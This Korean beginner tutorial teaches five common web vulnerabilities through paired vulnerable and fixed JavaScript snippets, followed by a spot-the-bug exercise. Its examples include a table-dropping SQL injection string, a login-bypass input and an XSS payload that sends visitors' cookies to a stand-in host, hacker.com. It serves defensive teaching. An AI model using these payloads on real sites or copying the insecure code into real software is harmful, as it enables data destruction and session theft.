# Step 1: 취약점 이해하기

> 코드에서 "약점"을 찾는 눈을 키워봅시다

---

## 취약점이란?

**취약점(vulnerability)**은 코드에서 **공격자가 악용할 수 있는 약점**입니다.

```
일상 비유:

집의 취약점                    코드의 취약점
----------                    ----------
문을 안 잠금                   로그인 검증 안 함
창문이 열려있음                 입력값 확인 안 함
비밀번호가 "1234"              비밀번호를 암호화 안 함
열쇠를 화분 아래 숨김           API 키를 코드에 직접 작성
```

대부분의 취약점은 **"깜빡해서"** 또는 **"이런 공격이 있는 줄 몰라서"** 생깁니다.

---

## Top 5 취약점 -- 코드로 살펴보기

### 1. SQL 인젝션

**비유**: 택배 주소란에 "문 열어"라고 적으면, 택배 기사가 진짜 문을 열어버리는 것

```javascript
// === 취약한 코드 (위험!) ===
// 사용자가 입력한 이름으로 DB를 검색하는 함수
function findUser(username) {
  // 사용자 입력을 그대로 SQL에 넣고 있어요!
  const query = "SELECT * FROM users WHERE name = '" + username + "'";
  return db.execute(query);
}

// 정상 사용:
// username = "철수"
// -> SELECT * FROM users WHERE name = '철수'    (OK!)

// 공격 사용:
// username = "'; DROP TABLE users; --"
// -> SELECT * FROM users WHERE name = ''; DROP TABLE users; --'
//   (사용자 테이블이 삭제됨!)
```

**무엇이 문제인가요?**
사용자 입력을 **검증 없이** SQL 문장에 직접 넣었기 때문입니다.

```javascript
// === 안전한 코드 (수정됨) ===
function findUser(username) {
  // 파라미터화 쿼리: ?에 값이 안전하게 들어감
  const query = "SELECT * FROM users WHERE name = ?";
  return db.execute(query, [username]);
}
// 이제 "'; DROP TABLE users; --"를 넣어도
// 그냥 문자열로 취급됨 (명령어로 실행되지 않음!)
```

---

### 2. XSS (크로스 사이트 스크립팅)

**비유**: 교실 게시판에 "이 링크 클릭해봐!"를 붙여놓고, 클릭하면 개인정보가 빠져나가는 것

```javascript
// === 취약한 코드 (위험!) ===
// 사용자가 작성한 댓글을 페이지에 표시하는 함수
function displayComment(comment) {
  // 사용자 입력을 HTML 요소에 직접 삽입!
  // 위험: DOM에 직접 HTML을 넣으면 스크립트가 실행될 수 있음
  document.getElementById('comments').insertAdjacentHTML('beforeend', comment);
}

// 정상 사용:
// comment = "좋은 글이네요!"
// -> 화면에 "좋은 글이네요!" 표시   (OK!)

// 공격 사용:
// comment = "<script>document.location='http://hacker.com/steal?c='+document.cookie</script>"
// -> 글을 읽은 모든 사람의 쿠키(로그인 정보)가 해커에게 전송!
```

```javascript
// === 안전한 코드 (수정됨) ===
function displayComment(comment) {
  // textContent는 HTML 태그를 실행하지 않고 텍스트로 표시
  const div = document.createElement('div');
  div.textContent = comment;
  document.getElementById('comments').appendChild(div);
}
// 이제 <script> 태그를 넣어도
// 그냥 텍스트로 보일 뿐 실행되지 않음!
```

---

### 3. 인증 우회

**비유**: 학교 이름표를 확인 안 해서, 이름표 없이도 교무실에 들어갈 수 있는 것

```javascript
// === 취약한 코드 (위험!) ===
// 마이페이지 - 내 정보 보기
app.get('/api/mypage', (req, res) => {
  // 로그인 여부를 확인하지 않음!
  const userId = req.query.userId;
  const userInfo = db.getUser(userId);
  res.json(userInfo);
});

// 문제: 로그인하지 않아도 URL에 userId만 넣으면
// 아무 사용자의 정보를 볼 수 있음!
// /api/mypage?userId=1  -> 1번 사용자 정보
// /api/mypage?userId=2  -> 2번 사용자 정보 (남의 정보!)
```

```javascript
// === 안전한 코드 (수정됨) ===
app.get('/api/mypage', requireLogin, (req, res) => {
  // requireLogin: 로그인 안 했으면 여기까지 오지 못함
  // req.user: 로그인한 사용자의 정보 (토큰에서 추출)
  const userId = req.user.id;  // URL이 아니라 토큰에서 가져옴!
  const userInfo = db.getUser(userId);
  res.json(userInfo);
});

// 이제 로그인한 사용자만 자기 정보를 볼 수 있음!
```

---

### 4. 민감 데이터 노출

**비유**: 비밀 일기를 투명 가방에 넣고 다니는 것

```javascript
// === 취약한 코드 (위험!) ===
// 사용자 정보를 저장하는 함수
function saveUser(username, password) {
  // 비밀번호를 그대로 저장! (평문 저장)
  db.insert({
    username: username,
    password: password  // "mypassword123" 그대로!
  });
}

// 문제: DB가 해킹되면 모든 비밀번호가 그대로 보임!
```

```javascript
// === 안전한 코드 (수정됨) ===
const bcrypt = require('bcrypt');

async function saveUser(username, password) {
  // 비밀번호를 해시(암호화)해서 저장
  const hashedPassword = await bcrypt.hash(password, 10);
  db.insert({
    username: username,
    password: hashedPassword  // "$2b$10$X7..." (알아볼 수 없음!)
  });
}

// 이제 DB가 해킹되어도 원래 비밀번호는 알 수 없음!
```

---

### 5. 보안 설정 오류

**비유**: 건물 공사가 끝났는데 비계(발판)를 안 치우고, 모든 문을 열어놓은 것

```javascript
// === 취약한 코드 (위험!) ===
// 에러가 발생했을 때 상세 정보를 모두 보여줌
app.use((err, req, res, next) => {
  res.status(500).json({
    error: err.message,
    stack: err.stack,           // 코드 파일 경로 노출!
    database: config.dbHost,    // DB 주소 노출!
    version: process.version    // 서버 버전 노출!
  });
});

// 문제: 공격자가 의도적으로 에러를 유발하면
// 서버의 내부 정보를 알아낼 수 있음!
```

```javascript
// === 안전한 코드 (수정됨) ===
app.use((err, req, res, next) => {
  // 로그에만 상세 정보 기록 (서버 내부용)
  console.error('Error:', err.stack);

  // 사용자에게는 일반적인 메시지만 보여줌
  res.status(500).json({
    error: "서버 오류가 발생했습니다. 잠시 후 다시 시도해주세요."
  });
});

// 이제 에러가 나도 내부 정보가 노출되지 않음!
```

---

## 체험: 이 코드의 문제를 찾아보세요

아래 코드를 보고 문제점을 찾아보세요. (정답은 아래에 있어요!)

```javascript
// 체험 문제
const express = require('express');
const app = express();

app.post('/login', (req, res) => {
  const { username, password } = req.body;

  const query = `SELECT * FROM users
    WHERE username = '${username}'
    AND password = '${password}'`;

  db.query(query, (err, users) => {
    if (users.length > 0) {
      res.cookie('user', username);
      res.send('로그인 성공!');
    } else {
      res.send('로그인 실패: ' + username + '님을 찾을 수 없습니다');
    }
  });
});
```

<details>
<summary>정답 보기 (클릭)</summary>

**문제 1**: SQL 인젝션 (심각)
- `username`과 `password`를 SQL에 직접 삽입
- 공격: `username = "admin' --"` -> 비밀번호 확인을 건너뜀!

**문제 2**: 비밀번호 평문 비교 (높음)
- 비밀번호를 해시하지 않고 DB에서 직접 비교
- DB에 비밀번호가 그대로 저장되어 있다는 뜻

**문제 3**: 쿠키 보안 없음 (보통)
- `res.cookie('user', username)` -- httpOnly, secure 플래그 없음
- 스크립트로 쿠키를 탈취할 수 있음

**문제 4**: 사용자 이름 반영 (낮음)
- 실패 메시지에 username을 그대로 포함 -- 반사형 XSS 가능성
- 입력 값이 HTML에 반영되면 스크립트 실행 위험

</details>

---

## 확인 체크리스트

- [ ] SQL 인젝션이 뭔지 이해했나요?
- [ ] XSS가 뭔지 이해했나요?
- [ ] 인증 우회가 뭔지 이해했나요?
- [ ] 취약한 코드와 안전한 코드의 차이를 구분할 수 있나요?

---

## 다음 단계

- [Step 2: 보안 스캔 기초](./step-02-scan-basics.md) -- Claude에게 보안 스캔을 요청하는 방법
- [취약 코드 샘플](../examples/vulnerable-code/) -- 더 많은 취약 코드 예제
